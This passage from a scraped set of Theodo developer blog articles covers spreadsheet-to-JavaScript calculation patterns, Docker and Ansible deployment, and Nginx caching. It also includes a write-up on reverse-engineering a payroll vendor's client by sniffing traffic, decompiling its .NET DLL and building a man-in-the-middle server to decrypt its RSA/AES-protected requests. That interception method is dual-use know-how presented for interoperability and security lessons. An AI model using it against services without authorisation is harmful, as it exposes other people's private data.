match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMatthieu Auger\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tImplementing complex calculations in a project can be quite tricky, especially when your only calculation model is a gigantic spreadsheet full of horrible formulas.\u00a0The aim of this article is to guide you through the construction of a clean and functional calculation code starting from such a spreadsheet, and to show you some tips to handle calculations without any pain.\nTo keep it simple, our working language in this article will be Javascript, but we will design abstract patterns that can be adapted to any language.\nLet\u2019s get started!\nBasic Structure and Code Pattern\nLet\u2019s describe the example spreadsheet.\u00a0It aims at forecasting the month-by-month evolution of a set of parameters \u2013 temperature, species distribution, air quality,\u2026 \u2013 in an ecological niche depending on given the initial state of the environment and some calculation parameters. This evolution can be calculated according to a model that describes the interaction between the different species and between the species and their environment.\nBasically, we can identify two areas in the spreadsheet: an area where we can specify the calculation parameters, and the resulting data table that has a fixed number of columns to compute \u2013 the data that we want to compute \u2013 and a number of lines that depends on the forecast duration.\u00a0The general structure is quite simple in this case: we will be doing a line-by-line computation, where the values in a line only depend on the past, thus on the previously computed lines.\nWe could be tempted to imitate the spreadsheet\u2019s apparent data structure by putting the result values in a matrix.\u00a0I strongly advise you against doing that, as you will end up with an unreadable code full of myMatrix[i][j-1] that will be horrible to maintain.\u00a0Our setup will be:\n\nan object for the input parameters;\na table of objects for the results, each line corresponding to a calculation row.\n\nThis allows you to label the object\u2019s values to clarify your code.\u00a0Here is an example of parameters object:\n\r\nvar calculationParams = {\r\n  forecastDurationInYears: 8,\r\n  foodResources: {\r\n    percentageForA: 10,\r\n    percentageForB: 13\r\n  },\r\n  predation: {\r\n    rateAB: 0.1,\r\n    rateBA: 0,\r\n    considerAB: true,\r\n    considerBA: false\r\n  },\r\n  ...\r\n  initialState: {\r\n    month: 0,\r\n    temperature: 28,\r\n    speciesA: {\r\n      population: 10000,\r\n      ...\r\n    },\r\n    speciesB: {\r\n      population: 700,\r\n      ...\r\n    },\r\n    ...\r\n  }\r\n};\r\n\nYou can provide new lines to your results table using a function:\n\r\nfunction initLine() {\r\n  const emptyLine = {\r\n    month: 0,\r\n    temperature: 0,\r\n    speciesA: {\r\n      population: 0,\r\n      ...\r\n    },\r\n    speciesB: {\r\n      population: 0,\r\n      ...\r\n    }\r\n  };\r\n  return emptyLine;\r\n}\r\n\nNow the calculations structurally boil down to adding and filling new lines to your results table. Let\u2019s write the main calculation function:\n\r\nfunction computeResults(calculationParams) {\r\n  const monthsToCompute = calculationParams.forecastDurationInYears * 12;\r\n  var resultsTable = [];\r\n  resultsTable.push(calculationParams.initialState);\r\n\r\n  for(var i=1; i<monthsToCompute; i++) {\r\n    computeLine(calculationParams, resultsTable, i);\r\n  }\r\n\r\n  return resultsTable;\r\n}\r\n\nand the line calculator:\n\r\nfunction computeLine(calculationParams, resultsTable, index) {\r\n  var newLine = initLine();\r\n  resultsTable.push(newLine);\r\n\r\n  computePopulationEvolutionA(calculationParams, resultsTable, index);\r\n  computePopulationEvolutionB(calculationParams, resultsTable, index);\r\n  // and so on!\r\n}\r\n\nWhat we just did looks like nothing, but the pattern we created allows you to handle the formulas and the calculation logic separately. You can now write the core calculation functions to compute the columns.\nWriting the Formulas\nWhat I suggest is to take a few minutes to analyse the formulas in your spreadsheet and to write them down in a documentation file in understandable terms.\u00a0This extra step gives you a file to keep track of the formulas \u2013 essential if you want someone else to understand your code without the spreadsheet \u2013 and it accelerates development.\u00a0Indeed, there is nothing more annoying than starting to code a feature without being 100% sure of what it will look like down to the last detail.\u00a0To convince yourself of the importance of this step, try to imagine what inspires you the most between\n=IF($B$4;IF($E50>$B$11;($E$2-$G$3*SUMIFS($H$10:$H49;$A$10:$A49;\">$A50-36\"))*$F50;0);IF($F50>0;($I$5-$I$6*(SUMIFS($H$10:$H49;$X50;true)-SUM($I$10:$I49)));0))\nand\n\r\nIF take predation A -> B into account\r\n\tIF population A > predation threshold\r\n\t\tpopulationEvolutionB = (reproductionRateA - predationRateAB * (sum on all the births for species B on the past 3 years)) *  population B\r\n\tELSE\r\n\t\t populationEvolutionB = 0\r\nELSE\r\n\tIF population B > 0\r\n\t\tpopulationEvolutionB = (birth rate B - death rate B) * ((sum on all the births of B in viable past months) - (sum on all the deaths of B over the past months))\r\n\tELSE\r\n\t\tpopulationEvolutionB = 0\r\n\nWhen coding, the second option is way better! When turning this formula into a function it gives us, without trying to refactor at first:\n\r\nfunction computePopulationEvolutionB(calculationParams, resultsTable, index) {\r\n  var line = resultsTable[index];\r\n  line.speciesB.evolution = 0;\r\n\r\n  var sumBirths3Years = 0;\r\n  var sumBirthsViable = 0;\r\n  var sumDeaths = 0;\r\n  for (var i=0; i < index; i++) { var loopLine = resultsTable[i]; if (loopLine.month >= line.month - 36)\r\n      sumBirths3Years += loopLine.speciesB.births;\r\n    if (loopline.speciesB.viableBirth)\r\n      sumBirthsViable += loopLine.speciesB.births;\r\n    sumDeaths += loopLine.speciesB.deaths;\r\n  }\r\n\r\n  if (calculationParams.predation.considerAB)\r\n    if (line.speciesA.population > calculationParams.predation.threshold)\r\n      line.speciesB.evolution = line.speciesB.population * (calculationParams.reproduction.rateA - calculationParams.predation.rateAB * sumBirths3Years);\r\n  else\r\n    if (line.speciesB.population > 0)\r\n      line.speciesB.evolution = (line.speciesB.birthRate - line.speciesB.deathRate) * (sumBirthsViable - sumDeaths);\r\n}\r\n\nwhich is not so obvious when you take a look at the spreadsheet formula\u2026\nAvoiding Redundant Calculations\nWe drew the most general code pattern for this kind of line-by-line calculations. Of course, the calculations themselves can be optimized, but this is specific to your formulas. If you look carefully at my previous implementation of computePopulationEvolutionB, you can notice that the calculation of the sums inside the function is completely inefficient, as I will need to recompute the sum every time I add a line to my results table.\nAn optimization workaround could be to create a helper object to keep track of the intermediate results:\n\r\nfunction computeResults(calculationParams) {\r\n  const monthsToCompute = calculationParams.forecastDurationInYears * 12;\r\n  var resultsTable = [];\r\n  resultsTable.push(calculationParams.initialState);\r\n\r\n  var calculationHelper = {\r\n    sumBirthsViableB: 0,\r\n    sumDeathsB: 0,\r\n    sumBirths3YearsB: 0\r\n  };\r\n\r\n  for(var i=0; i<monthsToCompute; i++) {\r\n    computeLine(calculationParams, resultsTable, calculationHelper, i);\r\n  }\r\n\r\n  return resultsTable;\r\n}\r\n\n\r\nfunction computeLine(calculationParams, resultsTable, calculationHelper, index) {\r\n  var newLine = initLine();\r\n  resultsTable.push(newLine);\r\n\r\n  computePopulationEvolutionA(calculationParams, resultsTable, index);\r\n  computePopulationEvolutionB(calculationParams, resultsTable, index);\r\n  // and so on!\r\n\r\n  updateCalculationHelper(calculationParams, resultsTable, calculationHelper, index);\r\n}\r\n\nand to update them accordingly using a new function. You end up with a clearer and more optimized code:\n\r\nfunction computePopulationEvolutionB(calculationParams, resultsTable, calculationHelper, index) {\r\n  var line = resultsTable[index];\r\n  line.firstColumn = 0;\r\n\r\n  if (calculationParams.predation.considerAB)\r\n    if (line.speciesA.population > calculationParams.predation.threshold)\r\n      line.speciesB.evolution = line.speciesB.population * (calculationParams.reproduction.rateA - calculationParams.predation.rateAB * calculationHelper.sumBirths3YearsB);\r\n  else\r\n    if (line.speciesB.population > 0)\r\n      line.speciesB.evolution = (line.speciesB.birthRate - line.speciesB.deathRate) * (calculationHelper.sumBirthsViableB - calculationHelper.sumDeathsB);\r\n}\r\n\nHandling Calculations Order\nThere is one last important thing I didn\u2019t adress in the previous pattern. How do I know in what order I am supposed to compute the columns?\nIndeed, the value A in a line can require some values B and C on the same line to be calculated first, but B may need a value D that is also a prerequisite to compute A\u2026 Argh! You could choose to draw a dependency graph out of the spreadsheet, but it is easy to make a mistake and this solution is not sustainable, for the formulas can evolve. I\u2019ve even seen spreadsheets in which the order in which to compute the values depends on the line!\nSo how can you handle such a mess like spreadsheet softwares do?\nOne solution is to promisify your calculation functions. I will not give more details about this solution which is too specific to Javascript and which makes your code an immediate mess in this case.\nI propose to choose a custom-made dependency resolver. Here is what we will do: we will store each computation function in an object, along with a state \u2013 computed or to compute and a depencency table that indicated the needed values before the calculation can be performed. In our case, it looks like\n\r\nfunction returnComputeFunctions() {\r\n  const computeFunctions = {\r\n    evolutionB: {\r\n      compute: (calculationParams, resultsTable, calculationHelper, index) => {\r\n        var line = resultsTable[index];\r\n        line.firstColumn = 0;\r\n\r\n        if (calculationParams.predation.considerAB)\r\n          if (line.speciesA.population > calculationParams.predation.threshold)\r\n            line.speciesB.evolution = line.speciesB.population * (calculationParams.reproduction.rateA - calculationParams.predation.rateAB * calculationHelper.sumBirths3YearsB);\r\n        else\r\n          if (line.speciesB.population > 0)\r\n            line.speciesB.evolution = (line.speciesB.birthRate - line.speciesB.deathRate) * (calculationHelper.sumBirthsViableB - calculationHelper.sumDeathsB);\r\n      },\r\n      computed: false,\r\n      getDependencies: (calculationParams) => {\r\n        if (calculationParams.predation.considerAB)\r\n          return [computeFunctions.populationB, computeFunctions.birthsB];\r\n        else\r\n          return [computeFunctions.birthViableB, computeFunctions.deathsB];\r\n      }\r\n    },\r\n    populationB: {\r\n      ...\r\n    },\r\n    ...\r\n  };\r\n}\r\n\nNow let\u2019s write a dependency resolver function:\n\r\nfunction resolveCalcDependencies(valueToCompute, calculationParams, resultsTable, calculationHelper, index) {\r\n  if (!valueToCompute.computed) {\r\n    valueToCompute.getDependencies(calculationParams).forEach((dependencyValue) => {\r\n      resolveCalcDependencies(dependencyValue, paramsWrapper);\r\n    });\r\n    valueToCompute.compute(calculationParams, resultsTable, calculationHelper, index);\r\n    valueToCompute.computed = true;\r\n  }\r\n}\r\n\nAs we are doing the calculations recursively, we just need to launch the process by telling the dependency resolver to compute the interesting values.\n\r\nfunction computeLine(calculationParams, resultsTable, calculationHelper, index) {\r\n  var newLine = initLine();\r\n  resultsTable.push(newLine);\r\n\r\n  var computeFunctions = returnComputeFunctions();\r\n  resolveCalcDependencies(computeFunctions.evolutionB);\r\n\r\n  updateCalculationHelper(calculationParams, resultsTable, calculationHelper, index);\r\n}\r\n\nThe resolver will pull all the dependencies step by step! Amazing, isn\u2019t it? The computed param is here to make sure that the function terminates, and that each computation is only performed once.\nGoing further: some tips\nAt this point, your calculations should be working and you may want to weep with joy. But now is also the time of refactoring and testing to make your code prettier and more sustainable! Here is what you can do:\n\nMake your code modular.\u00a0You may want to separate the value assignment from the formulas in different functions: it makes your functions shorter and testable.\nRefactor.\u00a0You don\u2019t want all your functions to have the same four parameters all along the code. Wrap these four parameters into a unique variable that you can pass to all the functions.\nTest.\u00a0If you made your code modular by creating functions specific to the formulas, you can easily make unit tests on them to make sure that the returned values are correct. A tested code is a rock-solid code.\n\nConclusion\nSome points to finish with:\n\nThis article does not claim to be an absolute guide to how to run calculations in a project, but it shows you global patterns and a way to reach them.\u00a0Do not hesitate to adapt them to your project!\nCut your work into smaller pieces! Your first goal should be to display an empty results table with the index filled \u2013 it allows you to draw and code the general pattern -, then you can proceed column by column.\u00a0The optimization steps can be included in future iterations.\nIf the spreadsheet is way too complex or if you have any doubt, don\u2019t hesitate to contact your client or the spreadsheet\u2019s author.\u00a0A 30-minute long workshop on the spreadsheet will help you develop your calculation feature faster.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLo\u00efc Gelle\r\n  \t\t\t\r\n  \t\t\t\tAgile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDocker shakes up the way we use to put into production. In this article I\u2019ll present\nthe main obstacles I encountered to set up the production workflow of a simple Node.js API called cinelocal.\nErratum: I am now using docker-machine instead of ansible. You can read in the comments why\nStep 1: set up a development environment\nDocker-compose is a tool for defining and running multi-container Docker applications. Cinelocal-api requires 3 services running in 3 containers:\n\nnode\npostgres\ndata (docker recommends to use a separated container for persisted data)\n\nHere is the corresponding docker-compose.yml defining the 3 services and their relations (read more about compose files):\n\r\n  \r\n# docker-compose.yml\r\ndata:\r\n  image: busybox\r\n  volumes:\r\n    - /data\r\n\r\ndb:\r\n  image: postgres:9.4\r\n  volumes_from:\r\n    - data\r\n  ports:\r\n    - \"5432:5432\"\r\n\r\napi:\r\n  image: node:wheezy\r\n  working_dir: /app\r\n  volumes:\r\n    - .:/app\r\n  links:\r\n   - db\r\n  ports:\r\n    - \"8000:8000\"\r\n  command: npm run watch\r\n  \r\n\nNotice the .:/app line in the API container that mounts the current folder as a container\u2019s volume so when you edit a source file it will be detected inside the container.\nThe npm command of the API container is defined in the package.json file. It runs database migrations (if any) and starts nodemon which is a utility that monitors for any change in your source and automatically restarts your server.\npackage.json:\n\r\n{\r\n  \"scripts\": {\r\n    \"watch\": \"db-migrate up --config migrations/database.json && node ./node_modules/nodemon/bin/nodemon.js src/server.coffee\"\r\n  }\r\n}\r\n\nNow the API can be started using the command docker-compose up api (it might crash the first time because the node container does not wait for the postgres container to be ready. It will work the second time. This is a known compose issue).\nUnfortunately using Docker adds a layer of complexity to the usual commands such as installing a new Node.js package or creating a new migration because it must be run in the container. So:\n\nAll your commands should be prefixed by docker-compose run --rm api\nThe edited files (package.json with npm install or migration files with db-migrate) will be owned by the docker user.\n\nTo bypass this complexity, you can use a Makefile that provides a set of commands.\n\r\n# Makefile\r\nwhoami := $(shell whoami)\r\n\r\nmigration-create:\r\n    docker-compose run --rm api \\\r\n    ./node_modules/db-migrate/bin/db-migrate create --config migrations/database.json $(name)\\\r\n     && sudo chown -R ${whoami}:${whoami} migrations\r\n\r\nmigration-up:\r\n    docker-compose run --rm api ./node_modules/db-migrate/bin/db-migrate up --config migrations/database.json\r\n\r\nmigration-down:\r\n    docker-compose run --rm api ./node_modules/db-migrate/bin/db-migrate down --config migrations/database.json\r\n\r\ninstall:\r\n  docker-compose run --rm api npm install\r\n\r\nnpm-install:\r\n    docker-compose run --rm api \\\r\n    npm install --save $(package)\\\r\n    && sudo chown ${whoami}:${whoami} package.json\r\n\nNow to install a package you can run: make npm-install package=lodash or to create a new migration: make migration-create name=add-movie-table.\nStep 2: Provisioning a server\nWith Docker, whatever your stack is, the provisioning will be the same. You\u2019ll have to install docker and optionally docker-compose, that\u2019s it.\nAnsible is a great tool to provision a server. You can compose a playbook with roles found on ansible galaxy.\nTo install docker and docker-compose on a server:\n\r\n# devops/provisioning.yml\r\n- name: cinelocal-api provisioning\r\n  hosts: all\r\n  sudo: true\r\n  pre_tasks:\r\n    - locale_gen: name=en_US.UTF-8 state=present\r\n  roles:\r\n    - angstwad.docker_ubuntu\r\n    - franklinkim.docker-compose\r\n  vars:\r\n    docker_group_members:\r\n      - ubuntu\r\n    update_docker_package: true\r\n\nBefore running the playbook you need to install the roles:\n\r\nansible-galaxy install -r devops/requirements.yml -p devops/roles\r\n\nwith:\n\r\n# devops/requirements.yml\r\n- src: angstwad.docker_ubuntu\r\n- src: franklinkim.docker-compose\r\n\nI tested this provisioning with Ansible 2.0.2 on Ubuntu Server 14.04.\n\r\n# Makefile\r\ninstall:\r\n  ansible-galaxy install -r devops/requirements.yml -p devops/roles\r\n\r\nprovisioning:\r\n    ansible-playbook devops/provisioning.yml -i devops/hosts/production\r\n\nStep 3: Package your app and deploy\nEach time I deploy the API, I build a new Docker image that I push on Docker Hub (the GitHub of Docker images).\nThe construction of the API image is described in a Dockerfile:\n\r\nFROM node:wheezy\r\n\r\n# Create app directory\r\nRUN mkdir -p /app\r\nWORKDIR /app\r\n\r\n# Install app dependencies\r\nCOPY package.json /app/\r\nRUN npm install\r\n\r\n# Bundle app source\r\nCOPY . /app\r\n\r\nEXPOSE 8000\r\nCMD [ \"npm\", \"start\" ]\r\n\nTo build and push the image on Docker Hub, I added these two tasks in the Makefile:\n\r\n# Makefile\r\nbuild:\r\n    docker build -t nicgirault/cinelocal-api .\r\n\r\npush: build\r\n    docker push nicgirault/cinelocal-api\r\n\nNow make push builds the image and pushes it on Docker Hub (after authentication).\nIn development environment I want to mount my code as a volume whereas it should not be the case in production. Using multiple Compose files enables you to customize a Compose application for different  environments. In our case, we want to split the description of the api service in a common configuration and a environment specific configuration.\n\r\n# docker-compose.yml (common configuration)\r\napi:\r\n  working_dir: /app\r\n  links:\r\n   - db\r\n  ports:\r\n    - \"8000:8000\"\r\n  environment:\r\n    DB_DATABASE: postgres\r\n    DB_USERNAME: postgres\r\n\n\r\n# docker-compose.dev.yml (development specific configuration)\r\napi:\r\n  image: node:wheezy\r\n  volumes:\r\n    - .:/app\r\n  command: npm run watch\r\n\n\r\n# docker-compose.prod.yml (production specific configuration)\r\napi:\r\n  image: nicgirault/cinelocal-api\r\n\nTo merge the specific configuration into the common configuration:\n\r\n  \r\n    docker-compose -f docker-compose.yml -f docker-compose.dev.yml up api\r\n  \r\n\nBy default, Compose checks the presence of docker-compose.override.yml so I renamed docker-compose.dev.yml to docker-compose.override.yml.\nNow I can deploy the API using 3 commands described in a simple Ansible playbook:\n\r\n# devops/deploy.yml\r\n- name: Cinelocal-api deployment\r\n  hosts: all\r\n  sudo: true\r\n  vars:\r\n    repository: https://github.com/nicgirault/cinelocal-api.git\r\n    path: /home/ubuntu/www\r\n    image: nicgirault/cinelocal-api\r\n  tasks:\r\n    - name: Pull github code\r\n      git: repo={{ repository }}\r\n           dest={{ path }}\r\n\r\n    - name: Pull API container\r\n      shell: docker pull {{ image }}\r\n\r\n    - name: Start API container\r\n      shell: docker-compose -f docker-compose.yml -f docker-compose.prod.yml up -d api\r\n      args:\r\n        chdir: {{ path }}\r\n\nIn the Makefile:\n\r\ndeploy: push\r\n    ansible-playbook -i devops/hosts/production devops/deploy.yml\r\n\nmake deploy builds the image, pushes it and runs the playbook.\nRead more about docker-compose in production.\nNote: Ansible embeds docker commands that avoid installing docker-compose on the server but force to duplicate the docker architecture description. Although I didn\u2019t use it for this project you might consider using it.\nBonus: continuous integration\nThis section explains how to automatically deploy on production when merging on the master branch if the build passes.\nThis is quite simple with circleCI and Docker Hub:\nHere is a circle.yml file that runs the tests and deploys if the build passes provided the destination branch is master:\n\r\nmachine:\r\n  services:\r\n    - docker\r\n  python:\r\n    version: 2.7.8\r\n  post:\r\n    # circle instance already run postgresql\r\n    - sudo service postgresql stop\r\n\r\ndependencies:\r\n  pre:\r\n    - pip install ansible\r\n    - pip install --upgrade setuptools\r\n\r\n  override:\r\n    - docker info\r\n    - docker build -t nicgirault/cinelocal-api .\r\n\r\ntest:\r\n  override:\r\n    - docker-compose run api npm test\r\n\r\ndeployment:\r\n  prod:\r\n    branch: master\r\n    commands:\r\n      - docker login -e $DOCKER_EMAIL -u $DOCKER_USER -p $DOCKER_PASS\r\n      - docker push nicgirault/cinelocal-api\r\n      - echo \"openstack ansible_host=$PROD_HOST ansible_ssh_user=$PROD_USER\" > devops/hosts/production\r\n      - ansible-playbook -i devops/hosts/production devops/deploy.yml\r\n\nIn addition you\u2019ll have to:\n\ndefine the environment variables used in this file in the circleCI project settings page\nauthorize circleCI to deploy on your server:\n\ngenerate a ssh key pair (use the command ssh-keygen)\nadd the private key on the project settings on circleCI interface\nadd the public key on the ~/.ssh/autorized_keys on the server\n\n\n\nFrom now deploying on production will be as simple as merging a branch to master.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Girault\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a web developer eager to create value for trustworthy businesses.\r\nSurrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tLegal disclaimer\n\nIn France, reverse engineering is allowed as long as it serves a goal of interoperability.\nHere, we will not be accessing data that should not have been accessible otherwise. Before trying to access data in a way that was not exactly meant to, it is always preferable to contact the company or individuals who are serving this data in the first place.\nI contacted Silaexpert regarding this article. I have detected no real security hole in their client, so they gave their approval for its publication.\n\u00a0\nThat being said, let\u2019s start!\n\nContext\nThe context is quite simple. The generation of payslip at Theodo is outsourced to another company: Silaexpert. We were given our credentials, and a url to access our vacations count and our payslips.\nThis all starts with a link: http://www.silaexpert01.fr/silae.\nThis link does not work in Chrome, Firefox or Safari. It does not run on a Windows 10 computer, so you can forget connecting from home on your nice gaming rig.\nIt seems to only work on Internet Explorer on Windows 7: bad news for all the developers at Theodo running Linux or OSX.\nThe black box\n\nWell, obviously, you could find other solutions. You can always borrow a friend or colleague computer running Windows. Great, now all your files are available on a shared computer.\nOr you can download a free virtual machine from Microsoft: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/. For this particular purpose, the VM with IE9 on Windows 7 works well.\nSo, now you have the virtual machine up and running, you can go to the url and\u2026 Whaaat ? It is downloading a fat client and starts some kind of install process. Just from that link. Thank you IE.\nFinally, you can login and painfully download your last payslip. And start again next month. If you reset the virtual machine, because, you know, licenses.\nAin\u2019t nobody got time for that!\nLet\u2019s jump in\nSome tooling\nI want to download my file directly from my Mac or Linux computer without going through all this VM nonsense. In order to do this, I have to send the right request to the remote server (I still do not know its address, which is probably hard coded in the downloaded fat client).\nSo, first things first, let\u2019s sniff all that network traffic going out of the VM.\nYou can use any network sniffing tool available for your platform:\n\nWireshark, avaiblable for most systems, maybe overkill here\nCharles Proxy on Mac\nmitmproxy if you like python\nFiddler on Windows (beta available for Mac and Linux)\n\nI personnally used Charles Proxy, in spite of its hideous icon.\n\nStart the HTTP proxy on the host machine. Go in Proxy > Proxy Settings and note the port it is using. \nStart your VM.\n\nOpen a command line, run ipconfig /all and note the Default Gateway IP. This is your host IP.\u00a0\nOpen Internet Explorer, go to Internet Options > Connections > LAN Settings and set the proxy settings with the IP and port from previous steps.\u00a0\n\n\nDone! You should see all traffic going out of the VM appearing in Charles.\n\nNow, if you login into the fat client and download a payslip, you should have enough information to start thinking.\n\nData analysis\nYou now have a complete exchange between the client and the server.\nThe first thing you notice is that all exchanges are done without SSL/TLS encryption. Free data, yeah! That being said, you could still have sniffed encrypted traffic by trusting the fake CA generated by your proxy on the virtual machine.\nYou can notice several things:\n\nA single webservice endpoint: http://www.silaexpert01.fr/SILAE/IWCF/IWCF.svc. All requests go to this url.\nThe protocol used is SOAP, without any web security module enabled.\nThe login request seems to be different from all other requests, which all look alike.\nThere is a bunch of base64 encoded data.\n\nYou can try to decode the base64 encoded data, but you will not be able to get anything readable. It is probably encrypted binary data.\nThe login request\nThe first request made to the server contains only one interesting piece of data, a key K:\n<RSAKeyValue>\r\n  <Modulus>odfDJj...pEQ2RQ==</Modulus>\r\n  <Exponent>AQAB</Exponent>\r\n</RSAKeyValue>\r\n\nThis key K is the public RSA key used by the client. The response also contains a key, using the same format, and some kind of identifier $USR. This received key is the public RSA key that the server will use.\nWe just witnessed an RSA key exchange. RSA cannot be used to encrypt large amount of data. Depending on the padding technique used, with a 2048 bit key (used here), you can encrypt at most 245 bytes. Not much.\nA technique commonly used is to use a private/public RSA key to encrypt a symmetric key, which is then used during the exchange.\nGood, I have the client and RSA keys, now what?\nGood question. Here, you are either a genius or you need a bit of help.\nHell yeah, I\u2019m a genius!\nOk, you are a genius (I never doubted it), you take the second message, and decode the base64 binary.\necho \"AQABAAAOE6jZqMmDnFHefXddjDq...W5A=\" | base64 -D | hexdump -C\r\n\nIf you do this several times, over several login request, you might notice a pattern.\n\nThe first few bytes are always 01 00 01 00 00. This can be seen directly in the base64: the first letters are always \u201cAQABAA\u201d. Something quite interesting is that 00 01 00 00 is the binary representation, on 4 bytes, little endian, of the decimal 256. Nice!\nAnother thing you might notice is at offset 261 (1 + 4 + 256), the bytes are always 20 00 00 00. This is 32 in decimal.\nHere is the genius part. A common symmetric encryption system is AES 256. It uses an initialization vector (IV) of\u2026 32 bytes.\nLittle recap:\n\nThe first byte is always 01.\nThe 4 next bytes give the size of the AES key: 256 bytes.\nThe next 256 bytes represent the actual AES key, encrypted using the public RSA key K which was sent to the server during the first phase.\nThe 4 next bytes give the size of the IV: 32 bytes.\nThe next 32 bytes define the IV.\nThe rest of the message is still unknown. Probably the login/password encrypted using the AES key.\n\nEven geniuses sometimes need a little push\nThere is only one AES, but many variants. You can try them all, but it will take a really long time and lots of developments.\nWe did not use all the cards in our hand at this point. Remember the fat client? It is our key to the encryption issue.\nReady to play a game?\n\nMy site is not really a site, it uses internet explorer to download an executable binary, which runs only on Windows and asks for specific libraries on Windows 10\u2026 In which language is the client developped?\nYou guessed it, .NET!\nEasily decompilable. Note that Java would have been fine too.\nLet\u2019s take a look at this code. You can get the url for the .exe by reading the other proxified requests. Import the .exe into the decompiler (I used the trial version of .Net Reflector in the Windows VM), and look for some interesting code. No luck this time, nothing.\nExcept for this one little DLL, Sila.WCFDLL.dll. Export it, and re-import it into the decompiler. And bingo, you have the serialization/deserialization procedures, with all the security stuff.\nWe were right about the AES. It uses the Rijndael 256 variant of the AES encryption with a custom serialization routine. If you are not a genius and missed the previous paragraph, you have here all the code for re-creating the message.\nOh, in case you were wondering about, the first byte is 01 when it contains AES information, 00 in all other cases.\nExploiting that knowledge\nHere, you are blocked. You cannot decrypt any of the AES keys, because you need the private RSA keys. The only option to get this AES key is to write a Man In The Middle (MITM) server, which intercepts every request between the client and the server and acts as the client for the server, and as the server for the client.\n\nCredits: Miraceti \u2014 Man in the middle attack \u2014 CC BY-SA 3.0\nOnce that server is written (avaiblable at https://github.com/kraynel/sila-cli/blob/master/server.js), and you have fixed all the buffer/byte conversion/RSA/mcrypt issues, you can reload your VM and login one more time.\nOnly this time, you will use the \u201cMap Remote\u201d option of Charles proxy to redirect all traffic going to http://www.silaexpert01.fr/SILAE/IWCF/IWCF.svc to your local endpoint, which will in turn decrypt the exchange and request the real endpoint.\nYou now have all requests, decrypted, in binary form.\n\nSerialization/Deserialization\nRequests are not directly readable. They are not using xml serialization but a custom, in house serialization technique. Who does that? Why?\nBut we have the code so we can look into it. And port it to JS (https://github.com/kraynel/sila-cli/blob/master/cbaSerialization.js).\nWe now have all the requests, and their responses, in plain, readable JS. By playing with the different parameters, we can identify two interesting requests:\n\nAcquisitionBulletins, which lists the avaiblable payslips;\nGenererPdf, which downloads a payslip as a pdf file.\n\nCongrats, you know everything about this service! You can write your own client!\n\nSome thoughts\n\nNever re-code security features which already exist in libraries.\nRSA key exchange, then AES encryption is basically TLS. Use HTTPS!\nPlease do not code your own serialization routines. Some really good libraries are already out there.\nUse known standards (REST or, if you really need it, SOAP) for your exchanges, and prefer formats which are easily interoperable (JSON, XML).\nBeware of replay attacks! Here, if I save the AES keys used with my MITM server, I can replay a request and decode the answer. The server would send me exactly the same response, every time, even a long time after the initial request.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tKevin Raynel\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSometimes, improving the user\u2019s loading experience is not enough, and you need real changes to make your application load faster.\nSo you try CSS and JS minification or image compression but your app is only a bit faster to load. These tricks reduce the size of resources that need to be downloaded, but what if your users didn\u2019t have to download anything at all? That\u2019s what caching is for!\nIn this article, I will explain how you can configure Nginx to enable the browser cache, thus avoiding painfully slow downloads. If you are not familiar with Nginx, I recommend reading this article.\nHow HTTP caching works\nCache configuration is done on the server side. Basically, it is the server\u2019s role to specify to the client any of these (with HTTP headers):\n\nif the resource may be cached\nby which type of cache the resource may be cached\nwhen the cached resource should expire\nwhen the resource was last modified\n\nBut it is worth keeping in mind that it is the client\u2019s responsibility to take the appropriate decision according to what the server replies. In particular, if you disable the cache in your browser or if you force the refresh of the page, the server\u2019s answer will not be taken into account and you will download the resources, no matter what.\nIf you\u2019re interested in knowing how the headers can be set to achieve the desired caching policy, I recommend this article. In the following part I will focus on how Nginx can be configured to send the proper headers.\nOn the client\u2019s side\nThe browser (without you noticing) automatically generates headers based on the resource already cached. The goal of these headers is to check if the cached resource is still fresh. There are two ways of doing that:\n\ncheck if the resource has been modified since it was cached\ncheck if the identifier of the resource (usually a digest) has changed\n\n\n\n\nHeader\nMeaning\n\n\n\n\nIf-Modified-Since: Thu, 26 May 2016 00:00:00 GMT\nThe server is allowed to return a status 304 (not modified) if the resource has not been modified since that date.\n\n\nIf-None-Match: \"56c62238977a31353ce7716e759a7edb\"\nThe server is allowed to return a status 304 (not modified) if the resource identifier is the 